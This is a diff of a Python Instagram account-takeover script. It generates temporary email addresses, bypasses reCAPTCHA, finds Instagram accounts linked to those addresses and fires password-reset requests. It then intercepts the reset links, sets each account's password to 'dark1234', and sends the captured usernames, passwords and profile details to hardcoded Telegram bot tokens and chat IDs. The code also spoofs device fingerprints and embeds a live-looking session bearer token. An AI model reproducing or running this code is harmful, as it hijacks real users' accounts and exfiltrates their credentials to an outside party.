@@ -6,26 +6,290 @@ import os
 import threading
 import random
 from time import sleep
-import httpx
-import uuid
-import string
+import httpx, uuid, time, random, string, uuid, user_agent
 import websocket
 import json
 import datetime
 import sys
-
-
-bi, hit, be, dead, gi, don = 0, 0, 0, 0, 0, 0
-donr = 0
-gm = 0
+from asmix import Instagram
+bi, hit, be, dead, gi ,don= 0, 0, 0, 0, 0, 0
+donr=0
 J = '\x1b[2;36m'
 N = '\x1b[1;37m'
+doner=0
+token2 = "8050806901:AAEhkrFv_0mN6rPgHqnLa9rIc1nu_s0R9xc"
+chid2 = "6504571995"
+token = "8517829338:AAFCv_V5SsTpRgtGcYEDNlhtoC9SOZMSMC8"
+chid = "8969627079"
+def get_instagram_info_api(username):
+    url = f"https://i.instagram.com/api/v1/users/web_profile_info/?username={username}"
+    
+    headers = {
+        "Accept": "*/*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Origin": "https://www.instagram.com",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+        "X-IG-App-ID": "936619743392459",
+        "X-Requested-With": "XMLHttpRequest"
+    }
+    
+    try:
+        with httpx.Client(http2=True, headers=headers, timeout=10.0) as session:
+            response = session.get(url)
+            if response.status_code == 200:
+                data = response.json()
+                user = data.get('data', {}).get('user', {})
+                
+                followers = user.get('edge_followed_by', {}).get('count', 0)
+                following = user.get('edge_follow', {}).get('count', 0)
+                full_name = user.get('full_name', 'N/A')
+                is_private = user.get('is_private', False)
+                is_verified = user.get('is_verified', False)
+                posts_count = user.get('edge_owner_to_timeline_media', {}).get('count', 0)
+                user_id = user.get('id', '0')
+                biography = user.get('biography', 'N/A')
+                is_professional = user.get('is_professional_account', False)
+                category = user.get('category_name', 'N/A')
+                email = user.get('business_email') or user.get('public_email') or 'N/A'
+                phone = user.get('business_phone_number') or user.get('public_phone_number') or 'N/A'
+                external_url = user.get('external_url', 'N/A')
+                profile_pic = user.get('profile_pic_url', 'N/A')
+                
+                return {
+                    'success': True,
+                    'followers': followers,
+                    'following': following,
+                    'full_name': full_name,
+                    'is_private': is_private,
+                    'is_verified': is_verified,
+                    'posts_count': posts_count,
+                    'user_id': user_id,
+                    'biography': biography,
+                    'is_professional': is_professional,
+                    'category': category,
+                    'email': email,
+                    'phone': phone,
+                    'external_url': external_url,
+                    'profile_pic': profile_pic,
+                    'username': user.get('username', username)
+                }
+            else:
+                return {'success': False, 'error': f'HTTP {response.status_code}'}
+    except Exception as e:
+        return {'success': False, 'error': str(e)}
 
-token = "8050806901:AAEhkrFv_0mN6rPgHqnLa9rIc1nu_s0R9xc"
-chid = "6504571995"
-token2 = "8517829338:AAFCv_V5SsTpRgtGcYEDNlhtoC9SOZMSMC8"
-chid2 = "8969627079"
+def get_account_creation_date(username):
+    try:
+        user_id = get_user_id_from_instagram(username)
+        if user_id == '0':
+            return None
 
+        url = "https://www.instagram.com/graphql/query/"
+        
+        headers = {
+            "Accept": "*/*",
+            "Accept-Language": "en-US,en;q=0.9",
+            "Origin": "https://www.instagram.com",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+            "X-IG-App-ID": "936619743392459",
+            "X-Requested-With": "XMLHttpRequest"
+        }
+        
+        variables = {
+            "id": user_id,
+            "first": 50  
+        }
+        
+        params = {
+            "query_hash": "e769aa130647d2354c40ea6a439bfc08",  
+            "variables": json.dumps(variables)
+        }
+        
+        response = requests.get(url, headers=headers, params=params, timeout=10)
+        
+        if response.status_code == 200:
+            data = response.json()
+            edges = data.get('data', {}).get('user', {}).get('edge_owner_to_timeline_media', {}).get('edges', [])
+            
+            if edges:
+                oldest_post = edges[-1].get('node', {})
+                taken_at = oldest_post.get('taken_at_timestamp')
+                
+                if taken_at:
+                    creation_date = datetime.datetime.fromtimestamp(taken_at)
+                    return creation_date.year
+        
+        return None
+        
+    except Exception as e:
+        print(f"Error getting creation date: {e}")
+        return None
+
+def get_user_id_from_instagram(username):
+    try:
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'X-IG-App-ID': '936619743392459'
+        }
+        
+        url = f"https://www.instagram.com/api/v1/users/web_profile_info/?username={username}"
+        response = requests.get(url, headers=headers)
+        
+        if response.status_code == 200:
+            data = response.json()
+            user_id = data.get('data', {}).get('user', {}).get('id', '0')
+            return user_id
+        return '0'
+    except:
+        return '0'
+
+def estimate_account_year(user_id, followers_count=0, posts_count=0):
+    try:
+        id_int = int(user_id)
+        current_year = datetime.datetime.now().year
+
+        if id_int < 1000000:
+            base_year = 2010
+        elif id_int < 10000000:
+            base_year = 2011
+        elif id_int < 100000000:
+            base_year = 2012
+        elif id_int < 500000000:
+            base_year = 2013
+        elif id_int < 1500000000:
+            base_year = 2014
+        elif id_int < 3000000000:
+            base_year = 2015
+        elif id_int < 5000000000:
+            base_year = 2016
+        elif id_int < 8000000000:
+            base_year = 2017
+        elif id_int < 12000000000:
+            base_year = 2018
+        elif id_int < 20000000000:
+            base_year = 2019
+        elif id_int < 30000000000:
+            base_year = 2020
+        elif id_int < 45000000000:
+            base_year = 2021
+        elif id_int < 65000000000:
+            base_year = 2022
+        elif id_int < 100000000000:
+            base_year = 2023
+        else:
+            base_year = 2027
+
+        if base_year > current_year:
+            base_year = current_year
+
+        if posts_count == 0:
+            if base_year < current_year - 1:
+                return current_year - 1
+        elif posts_count < 5 and followers_count < 50:
+            if base_year < current_year - 1:
+                return current_year - 1
+        
+        return base_year
+        
+    except:
+        return datetime.datetime.now().year
+
+def get_followers_following(username):
+    result = get_instagram_info_api(username)
+    
+    if result['success']:
+        creation_year = get_account_creation_date(username)
+        if creation_year:
+            account_year = creation_year
+        else:
+            account_year = estimate_account_year(result['user_id'], result['followers'], result['posts_count'])
+        
+        return (
+            result['followers'],
+            result['following'],
+            result['full_name'],
+            result['is_private'],
+            result['is_verified'],
+            result['posts_count'],
+            account_year,
+            result
+        )
+    else:
+        try:
+            followers, following, full_name, is_private, is_verified, posts_count = get_user_info_from_instagram(username)
+            user_id = get_user_id_from_instagram(username)
+            account_year = estimate_account_year(user_id, followers, posts_count)
+            return followers, following, full_name, is_private, is_verified, posts_count, account_year, None
+        except:
+            return 0, 0, 'N/A', False, False, 0, datetime.datetime.now().year, None
+
+def get_user_info_from_instagram(username):
+    try:
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'none',
+            'Sec-Fetch-User': '?1',
+            'Cache-Control': 'max-age=0'
+        }
+        
+        url = f"https://www.instagram.com/{username}/"
+        response = requests.get(url, headers=headers)
+        
+        if response.status_code == 200:
+            content = response.text
+            
+            try:
+                shared_data_match = re.search(r'window\._sharedData\s*=\s*({.*?});', content)
+                if shared_data_match:
+                    shared_data = json.loads(shared_data_match.group(1))
+                    user_data = shared_data.get('entry_data', {}).get('ProfilePage', [{}])[0].get('graphql', {}).get('user', {})
+                    
+                    followers = user_data.get('edge_followed_by', {}).get('count', 0)
+                    following = user_data.get('edge_follow', {}).get('count', 0)
+                    full_name = user_data.get('full_name', '')
+                    is_private = user_data.get('is_private', False)
+                    is_verified = user_data.get('is_verified', False)
+                    posts_count = user_data.get('edge_owner_to_timeline_media', {}).get('count', 0)
+                    
+                    return followers, following, full_name, is_private, is_verified, posts_count
+            except:
+                pass
+            
+            followers_match = re.search(r'"edge_followed_by":\s*{"count":\s*(\d+)}', content)
+            following_match = re.search(r'"edge_follow":\s*{"count":\s*(\d+)}', content)
+            fullname_match = re.search(r'"full_name":"([^"]+)"', content)
+            private_match = re.search(r'"is_private":(true|false)', content)
+            verified_match = re.search(r'"is_verified":(true|false)', content)
+            posts_match = re.search(r'"edge_owner_to_timeline_media":{"count":(\d+)}', content)
+            
+            followers = int(followers_match.group(1)) if followers_match else 0
+            following = int(following_match.group(1)) if following_match else 0
+            full_name = fullname_match.group(1) if fullname_match else ''
+            is_private = private_match.group(1) == 'true' if private_match else False
+            is_verified = verified_match.group(1) == 'true' if verified_match else False
+            posts_count = int(posts_match.group(1)) if posts_match else 0
+                
+        return followers, following, full_name, is_private, is_verified, posts_count
+        
+    except Exception as e:
+        return 0, 0, '', False, False, 0
+
+
+
+def banner():
+    try:
+        from cfonts import render
+        WDEH = render('{END}', colors=['red', 'white'], align='center')
+    except ImportError:
+        pass
+    print(WDEH)
 
 def generate_device_info():
     devices = [
@@ -43,6 +307,38 @@ def generate_device_info():
     password_suffix = 'dark1234'
     PASSWORD = f'#PWD_INSTAGRAM:0:{timestamp}:{password_suffix}'
     return ANDROID_ID, USER_AGENT, WATERFALL_ID, PASSWORD, device
+
+def make_headers(mid='', user_agent='', android_id=''):
+    return {
+        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        'X-Bloks-Version-Id': 'e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd',
+        'X-Mid': mid,
+        'User-Agent': user_agent,
+        'X-IG-Device-ID': android_id,
+        'X-IG-Android-ID': android_id.replace('android-', ''),
+        'X-IG-App-ID': '567067343352427',
+        'X-IG-Connection-Type': 'WIFI',
+        'X-IG-Capabilities': '3brTvw==',
+        'X-FB-HTTP-Engine': 'Liger',
+        'Accept-Language': 'en-US,en;q=0.9',
+        'Accept-Encoding': 'gzip, deflate, br',
+        'Connection': 'keep-alive'
+    }
+
+def id_user(user_id):
+    time.sleep(random.uniform(1.0, 2.5))
+    url = f'https://i.instagram.com/api/v1/users/{user_id}/info/'
+    headers = {'User-Agent': 'Instagram 285.0.0.0.107 Android', 'X-IG-App-ID': '567067343352427'}
+    try:
+        r = requests.get(url, headers=headers, timeout=10)
+        username = r.json()['user']['username']
+        return username
+    except:
+        return None
+
+def simulate_human_delay():
+    delays = [1.5, 2.0, 2.5, 3.0]
+    time.sleep(random.choice(delays))
 
 def generate_android_id():
     return 'android-' + ''.join(random.choices(string.hexdigits.lower(), k=16))
@@ -92,135 +388,6 @@ def generate_user_agent():
     
     return f'Instagram 398.0.0.45.77 Android ({android_sdk}/{android_ver}; {dpi}dpi; {resolution}; {manufacturer}; {model}; {codename}; {chipset}; {locale}; {build_number})'
 
-def simulate_human_delay():
-    delays = [1.5, 2.0, 2.5, 3.0]
-    time.sleep(random.choice(delays))
-
-def make_headers(mid='', user_agent='', android_id=''):
-    return {
-        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        'X-Bloks-Version-Id': 'e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd',
-        'X-Mid': mid,
-        'User-Agent': user_agent,
-        'X-IG-Device-ID': android_id,
-        'X-IG-Android-ID': android_id.replace('android-', ''),
-        'X-IG-App-ID': '567067343352427',
-        'X-IG-Connection-Type': 'WIFI',
-        'X-IG-Capabilities': '3brTvw==',
-        'X-FB-HTTP-Engine': 'Liger',
-        'Accept-Language': 'en-US,en;q=0.9',
-        'Accept-Encoding': 'gzip, deflate, br',
-        'Connection': 'keep-alive'
-    }
-
-def get_instagram_info_api(username):
-    url = f"https://i.instagram.com/api/v1/users/web_profile_info/?username={username}"
-    
-    headers = {
-        "Accept": "*/*",
-        "Accept-Language": "en-US,en;q=0.9",
-        "Origin": "https://www.instagram.com",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
-        "X-IG-App-ID": "936619743392459",
-        "X-Requested-With": "XMLHttpRequest"
-    }
-    
-    try:
-        with httpx.Client(http2=True, headers=headers, timeout=10.0) as session:
-            response = session.get(url)
-            if response.status_code == 200:
-                data = response.json()
-                user = data.get('data', {}).get('user', {})
-                
-                return {
-                    'success': True,
-                    'followers': user.get('edge_followed_by', {}).get('count', 0),
-                    'following': user.get('edge_follow', {}).get('count', 0),
-                    'full_name': user.get('full_name', 'N/A'),
-                    'is_private': user.get('is_private', False),
-                    'is_verified': user.get('is_verified', False),
-                    'posts_count': user.get('edge_owner_to_timeline_media', {}).get('count', 0),
-                    'user_id': user.get('id', '0'),
-                    'username': user.get('username', username)
-                }
-            return {'success': False, 'error': f'HTTP {response.status_code}'}
-    except Exception as e:
-        return {'success': False, 'error': str(e)}
-
-def get_user_id_from_instagram(username):
-    try:
-        headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-            'X-IG-App-ID': '936619743392459'
-        }
-        url = f"https://www.instagram.com/api/v1/users/web_profile_info/?username={username}"
-        response = requests.get(url, headers=headers)
-        if response.status_code == 200:
-            return response.json().get('data', {}).get('user', {}).get('id', '0')
-        return '0'
-    except:
-        return '0'
-
-def estimate_account_year(user_id, followers_count=0, posts_count=0):
-    try:
-        id_int = int(user_id)
-        current_year = datetime.datetime.now().year
-
-        if id_int < 1000000:
-            base_year = 2010
-        elif id_int < 10000000:
-            base_year = 2011
-        elif id_int < 100000000:
-            base_year = 2012
-        elif id_int < 500000000:
-            base_year = 2013
-        elif id_int < 1500000000:
-            base_year = 2014
-        elif id_int < 3000000000:
-            base_year = 2015
-        elif id_int < 5000000000:
-            base_year = 2016
-        elif id_int < 8000000000:
-            base_year = 2017
-        elif id_int < 12000000000:
-            base_year = 2018
-        elif id_int < 20000000000:
-            base_year = 2019
-        elif id_int < 30000000000:
-            base_year = 2020
-        elif id_int < 45000000000:
-            base_year = 2021
-        elif id_int < 65000000000:
-            base_year = 2022
-        elif id_int < 100000000000:
-            base_year = 2023
-        else:
-            base_year = 2024
-
-        return min(base_year, current_year)
-    except:
-        return datetime.datetime.now().year
-
-def get_followers_following(username):
-    result = get_instagram_info_api(username)
-    
-    if result['success']:
-        user_id = result['user_id']
-        account_year = estimate_account_year(user_id, result['followers'], result['posts_count'])
-        
-        return (
-            result['followers'],
-            result['following'],
-            result['full_name'],
-            result['is_private'],
-            result['is_verified'],
-            result['posts_count'],
-            account_year,
-            result
-        )
-    return 0, 0, 'N/A', False, False, 0, datetime.datetime.now().year, None
-
-
 def reset_instagram_password(reset_link):
     try:
         ANDROID_ID, USER_AGENT, WATERFALL_ID, PASSWORD, device_info = generate_device_info()
@@ -233,7 +400,7 @@ def reset_instagram_password(reset_link):
         
         simulate_human_delay()
         
-        url = 'https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/'
+        url = 'https://i.instagram.com/api/v1/accounts/password_reset/'
         data = {
             'source': 'one_click_login_email',
             'uidb36': uidb36,
@@ -333,7 +500,6 @@ def reset_instagram_password(reset_link):
     except Exception as e:
         return {'success': False, 'error': str(e)}
 
-# ========== دالة send المعدلة بالاتصالات الجديدة ==========
 def send(eml):
     global don
     session = requests.Session()
@@ -341,40 +507,28 @@ def send(eml):
     device_id = generate_device_id()
     family_device_id = generate_family_device_id()
     mid = generate_mid()
+    user_agent = generate_user_agent()
     
-    # ========== الاتصالات الجديدة من الكود الثاني ==========
     headers = {
-        'User-Agent': f"Instagram 438.0.0.28.88 Android ("
-                      f"{random.choice(['10/29', '11/30', '12/31', '13/33', '14/34'])}; "
-                      f"{random.choice(['420dpi', '450dpi', '480dpi', '560dpi'])}; "
-                      f"{random.choice(['1080x2316', '1440x3088', '1080x2400', '1440x3120'])}; "
-                      f"{random.choice(['samsung; SM-S918B; dm3; exynos2200', 'samsung; SM-G998B; o1s; exynos2100', 'google; Pixel 7 Pro; cheetah; gs201', 'xiaomi; 23127PN0CC; houji; snapdragon8gen3'])}; "
-                      f"{random.choice(['ar_YE', 'en_US', 'en_GB'])}; "
-                      f"{random.randint(1017398461, 1017550000)})",
-        'accept-language': "ar-YE, en-US",
-        'priority': "u=3, i",
-        'x-bloks-version-id': "cd9dab6073153a9f827d566c759c87b5110f8a64fa8ca0fed8566f013a623f79",
-        'x-client-doc-id': "356548512611906258864738750706",
-        'x-fb-client-ip': "True",
-        'x-fb-friendly-name': "IGBloksAppRootQuery-com.bloks.www.bloks.caa.reg.async.contactpoint_email.async",
-        'x-fb-server-cluster': "True",
-        'x-ig-android-id': android_id,
-        'x-ig-app-id': "567067343352427",
-        'x-ig-app-locale': "ar_YE",
-        'x-ig-capabilities': "3brTv10=",
-        'x-ig-device-id': device_id,
-        'x-ig-device-locale': "ar_YE",
-        'x-ig-is-foldable': "false",
-        'x-ig-mapped-locale': "ar_AR",
-        'x-ig-timezone-offset': "10800",
-        'x-ig-validate-null-in-legacy-dict': "true",
-        'x-root-field-name': "bloks_action",
-        'x-tigon-is-retry': "False",
-        'x-zero-balance': "INIT",
-        'x-fb-http-engine': "Tigon/MNS/TCP",
-        'x-graphql-client-library': "pando",
-        'x-graphql-request-purpose': "fetch",
-        'zero-http-network-interface': random.choice(['cellular', 'wifi', 'ethernet'])
+        'User-Agent': f'{user_agent}',
+        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        'accept-language': 'en-US',
+        'ig-intended-user-id': '0',
+        'x-bloks-is-layout-rtl': 'false',
+        'x-bloks-version-id': 'b86f6fc6f8131e7f0d789ecd251bbf01896d7d103e6345b34d3e806663c0ff8b',
+        'x-fb-friendly-name': 'IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/',
+        'x-ig-android-id': android_id, 
+        'x-ig-app-id': '567067343352427',
+        'x-ig-app-locale': 'en_US',
+        'x-ig-capabilities': '3brTv10=',
+        'x-ig-connection-type': 'WIFI',
+        'x-ig-device-id': device_id,  
+        'x-ig-device-locale': 'ar_LY',
+        'x-ig-family-device-id': family_device_id,  
+        'x-ig-timezone-offset': '10800',
+        'x-ig-www-claim': '0',
+        'x-mid': mid,  
+        'Connection': 'close',
     }
     
     params_text = '{"client_input_params":{"search_query":"' + eml + '","accounts_list":[{"uid":"61242848064","credential_type":"spc_local_auth","token":"BearerIGT:2:eyJkc191c2VyX2lkIjoiNjEyNDI4NDgwNjQiLCJzZXNzaW9uaWQiOiI2MTI0Mjg0ODA2NCUzQXBUNnh2TVhDUWJBQ3RrJTNBMjklM0FBWWprbUZENVNZLUFnQ3NvU3ZFbFZzaUtlOGN1RVVmN2lPcnE0ZDRnbmcifQ=="}],"android_build_type":"release"}}'
@@ -384,130 +538,35 @@ def send(eml):
         'bk_client_context': '{"bloks_version":"b86f6fc6f8131e7f0d789ecd251bbf01896d7d103e6345b34d3e806663c0ff8b","styles_id":"instagram"}',
         'bloks_versioning_id': 'b86f6fc6f8131e7f0d789ecd251bbf01896d7d103e6345b34d3e806663c0ff8b',
     }
-    
     try:
         response = session.post(
             'https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/',
             headers=headers,
             data=data,
-            stream=True
+            stream=True      
         ).text
+        print('')
+        hidden_email = None
+        match = re.search(r'([a-zA-Z0-9]\*+[a-zA-Z0-9]@[a-zA-Z0-9]+\.[a-zA-Z]+)', response)
+        if match:
+            hidden_email = match.group(1)
+        
+        success = False
         
         if f"We sent a link to {eml}" in response:
             don += 1
-            return True, None, eml
-        return False, None, eml
+        elif 'Please try again.' in response and 'Sorry, something went wrong' in response:
+            print('turn on vpn :')
+        else:
+            print('ops')
+        
+        return success, hidden_email, eml  
+        
     except Exception as e:
         print(e)
-        return False, None, eml
-
-def check_email(email):
-    global bi, hit, be, gm
-    
-    siteKey = '6LfEUPkgAAAAAKTgbMoewQkWBEQhO2VPL4QviKct'
-    siteUrl = 'https://hi2.in/'
-    userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36'
-
-    site_html = requests.get(siteUrl).text
-
-    try:
-        renderUrl = re.findall(r'''"https://[^"]+\.js"''', site_html)[0].strip('"')
-    except:
-        renderUrl = 'https://www.google.com/recaptcha/api2/recaptcha__en.js'
-
-    js = requests.get(renderUrl).text
-    match = re.search(r"po\.src\s*=\s*'(https://[^']+)';", js)
-
-    if match:
-        v = match.group(1).split('/')[5]
-        api = renderUrl.split('.js')[0]
-        if 'api2' not in api and 'enterprise' not in api:
-            api += '2'
-    else:
-        v = renderUrl.split('/')[5]
-        api = 'https://www.google.com/recaptcha/api2'
-
-    site = requests.get('https://www.google.com')
-    cookies = site.cookies
-
-    headers = {
-        "accept": "/",
-        "accept-language": "en-US,en;q=0.9",
-        "origin": "https://www.google.com",
-        "sec-fetch-mode": "cors",
-        "sec-fetch-site": "same-origin",
-        "user-agent": userAgent
-    }
-
-    domain = siteUrl.split('/')[2]
-    co = base64.b64encode((f'https://{domain}:443').encode()).decode().replace('=', '.')
-
-    anchor_params = {
-        'ar': '1',
-        'k': siteKey,
-        'co': co,
-        'hl': 'en',
-        'v': v,
-        'size': 'invisible',
-        'cb': 'abc123'
-    }
-
-    headers['referer'] = siteUrl
-
-    anchor = requests.get(f'{api}/anchor', params=anchor_params, headers=headers, cookies=cookies).text
-    recaptcha_token = anchor.split('recaptcha-token" value="')[1].split('"')[0]
-
-    reload_headers = headers.copy()
-    reload_headers.pop('content-type', None)
-
-    reload_data = {
-        'v': v,
-        'co': co,
-        'reason': 'q',
-        'size': 'invisible',
-        'hl': 'en',
-        'k': siteKey,
-        'c': recaptcha_token,
-        'chr': '',
-        'vh': '',
-        'bg': ''
-    }
-
-    reload = requests.post(f'{api}/reload?k={siteKey}', data=reload_data, headers=reload_headers, cookies=cookies).text
-    final_token = reload.split('"rresp","')[1].split('"')[0]
-
-    prefix, domin = email.split('@')
-
-    headers2 = {
-        'accept': 'application/json, text/plain, */*',
-        'content-type': 'application/x-www-form-urlencoded',
-        'origin': 'https://hi2.in',
-        'referer': 'https://hi2.in/',
-        'user-agent': userAgent
-    }
-
-    data = {
-        'domain': domin,
-        'prefix': prefix,
-        'recaptcha': final_token
-    }
-
-    rss = requests.post('https://hi2.in/api/custom', headers=headers2, data=data)
-    rs = rss.json()
-    print(rs)
-    
-    if "hash" in rss.text:
-        eml = rs.get('email')
-        hash_val = rs.get('hash')
-        ex = rs.get('expiry')
-        getu(eml, hash_val, ex)
-        gm += 1
-    else:
-        be += 1
 
 def getu(eml, hash_val, ex):
-    global donr, dead
-    
+    global donr,dead
     ws = websocket.WebSocket()
     ws.connect("wss://ws.checker.in:8443", header=[
         "User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36",
@@ -518,7 +577,7 @@ def getu(eml, hash_val, ex):
     ws.send(f"{ex}-{eml}-{hash_val}")
     ws.send("ping")
     
-    i = 0
+    i=0
     reset_link = None
     username = None
     send(eml)
@@ -555,42 +614,51 @@ def getu(eml, hash_val, ex):
                             result = reset_instagram_password(reset_link)
                             donr += 1
                             
-
+                            
                             print(f"[+] Fetching account info for: {username}")
                             followers_count, following_count, full_name, is_private, is_verified, posts_count, account_year, additional_info = get_followers_following(username)
                             
                             private_status = " Private" if is_private else " Public"
                             verified_status = "✓ Verified" if is_verified else "✗ Not Verified"
                             
-
                             ff = f'''
 ✅ Instagram Account Reset Complete!
-   Email       : {eml}
-   USER         :{username}
-   PAASOWRD       : dark1234
-   NAME          : {full_name}
-   ID            : {result.get('user_id', 'N/A')}
-   POSTS         : {posts_count}
-   FOLLOWERS     : {followers_count}
-   FOLLOWING     : {following_count}
-   DATE          : {account_year}
-   LINK          : https://instagram.com/{username}  
-   '''
-                            
 
-                            requests.post(f"https://api.telegram.org/bot{token2}/sendMessage?chat_id={chid2}&text={ff}")
+Email : {eml}
+Username : {username}
+New Password : dark1234
+ Account Statistics:
+Full Name: {full_name}
+Followers: {followers_count:,}
+Following: {following_count:,}
+Posts: {posts_count}
+Account Year: {account_year}
+Status: {private_status} | {verified_status}
+════════════════════════════════
+ Profile: instagram.com/{username}
+By eng : @FFNZZ && @eo_xr
+'''
                             
-                            with open('hits.txt', "a", encoding="utf-8") as f:
-                                f.write(ff + "\n")
-                            
+                            message = ff
+                            url = f"https://api.telegram.org/bot{token}/sendMessage"
+                            data = {
+                                "chat_id": chid,
+                                "text": message
+                            }
+                            response = requests.post(url, data=data)
+                            with open('/storage/emulated/0/Hi2hits.txt', "a", encoding="utf-8") as f:
+                                f.write(f"{eml} | {username} | dark1234 | followers:{followers_count} | year:{account_year}\n")
                             with open('/storage/emulated/0/Download/etc.txt', 'a', encoding='utf-8') as f:
-                                f.write(f"{eml}\n")
-                            
+                                	f.write(f"{eml}\n")
                             message = f"✅ Good Email: {eml}"
+                            url = f"https://api.telegram.org/bot{token2}/sendMessage"
+                            requests.post(url, data={"chat_id": chid2, "text": message})
+                            with open('/storage/emulated/0/Download/etc1.txt', 'a', encoding='utf-8') as f:
+                            	f.write(f"{username}:dark1234\n")
                             url = f"https://api.telegram.org/bot{token}/sendMessage"
                             requests.post(url, data={"chat_id": chid, "text": message})
-                            
                             print("[✓] Saved to Hi2hits.txt")
+                            
                             ws.close()
                             return None, None
                             
@@ -608,6 +676,129 @@ def getu(eml, hash_val, ex):
     ws.close()
     return None, None
 
+gm=0
+
+def check_email(email): 
+    global bi, hit, be, gm
+    siteKey = '6LfEUPkgAAAAAKTgbMoewQkWBEQhO2VPL4QviKct'
+    siteUrl = 'https://hi2.in/'
+    userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36'
+
+    request_kwargs = {}
+ 
+    site_html = requests.get(siteUrl, **request_kwargs).text
+
+    try:
+        renderUrl = re.findall(r'''"https://[^"]+\.js"''', site_html)[0].strip('"')
+    except:
+        renderUrl = 'https://www.google.com/recaptcha/api2/recaptcha__en.js'
+
+    js = requests.get(renderUrl, **request_kwargs).text
+
+    match = re.search(r"po\.src\s*=\s*'(https://[^']+)';", js)
+
+    if match:
+        v = match.group(1).split('/')[5]
+        api = renderUrl.split('.js')[0]
+        if 'api2' not in api and 'enterprise' not in api:
+            api += '2'
+    else:
+        v = renderUrl.split('/')[5]
+        api = 'https://www.google.com/recaptcha/api2'
+
+    site = requests.get('https://www.google.com', **request_kwargs)
+    cookies = site.cookies
+
+    headers = {
+        "accept": "/",
+        "accept-language": "en-US,en;q=0.9",
+        "origin": "https://www.google.com",
+        "sec-fetch-mode": "cors",
+        "sec-fetch-site": "same-origin",
+        "user-agent": userAgent
+    }
+
+    domain = siteUrl.split('/')[2]
+    co = base64.b64encode((f'https://{domain}:443').encode()).decode().replace('=', '.')
+
+    anchor_params = {
+        'ar': '1',
+        'k': siteKey,
+        'co': co,
+        'hl': 'en',
+        'v': v,
+        'size': 'invisible',
+        'cb': 'abc123'
+    }
+
+    headers['referer'] = siteUrl
+
+    anchor = requests.get(f'{api}/anchor', params=anchor_params, headers=headers, cookies=cookies, **request_kwargs).text
+    recaptcha_token = anchor.split('recaptcha-token" value="')[1].split('"')[0]
+
+    reload_headers = headers.copy()
+    reload_headers.pop('content-type', None)
+
+    reload_data = {
+        'v': v,
+        'co': co,
+        'reason': 'q',
+        'size': 'invisible',
+        'hl': 'en',
+        'k': siteKey,
+        'c': recaptcha_token,
+        'chr': '',
+        'vh': '',
+        'bg': ''
+    }
+
+    reload = requests.post(f'{api}/reload?k={siteKey}', data=reload_data, headers=reload_headers, cookies=cookies, **request_kwargs).text
+    final_token = reload.split('"rresp","')[1].split('"')[0]
+
+    prefix, domin = email.split('@')
+
+    headers2 = {
+        'accept': 'application/json, text/plain, */*',
+        'content-type': 'application/x-www-form-urlencoded',
+        'origin': 'https://hi2.in',
+        'referer': 'https://hi2.in/',
+        'user-agent': userAgent
+    }
+
+    data = {
+        'domain': domin,
+        'prefix': prefix,
+        'recaptcha': final_token
+    }
+
+    rss = requests.post('https://hi2.in/api/custom', headers=headers2, data=data, **request_kwargs)
+    rs = rss.json()
+    print(rs)
+    if "hash" in rss.text:
+        eml = rs.get('email')
+        hash_val = rs.get('hash')
+        ex = rs.get('expiry')
+        
+        
+        getu(eml, hash_val, ex)
+        
+        
+        
+        print(f"\n Good Email -: {eml}")
+        
+        gm += 1
+          
+        
+    else:
+        be += 1
+
+print('''
+1 - hi2.in
+2- telemail.com
+3 - random
+''')
+cl=int(input("num:"))
+
 def em(email):
     global bi, hit, be, dead, gi, donr, don, gm
     
@@ -623,21 +814,28 @@ def em(email):
             ).json()
         
         if res.get('error_type') == 'email_is_taken':
-            check_email(email)
+            check_email(email)  
             gi += 1
+            
         else:
             bi += 1
             
-        print(f'''hits:{donr}	good email:{gm}	bad email:{be}	bad ig:{bi}	good ig:{gi}	dead acc:{dead}
-''')
+            print(f'''\033[1;32mhits : {donr} |\033[1;36mgood email : {gm} | \033[1;31mbad email : {be} |\033[1;33mbad ig : {bi} | \033[1;32mgood ig : {gi}  | \033[1;35mdead acc : {dead}\033[0m''')
+            
     except Exception as e:
-        pass
+        print(f"خطأ: {e}")
 
 def qq():
-    ema = random.choice(['hi2.in', 'telegmail.com'])
+    ema=random.choice(['hi2.in','telegmail.com'])
     letters = "abcdefghijklmnopqrstwvwxyzuxyz"
-    cil = "".join(random.choice(letters) for _ in range(6))
-    email = cil + '@' + 'hi2.in'  
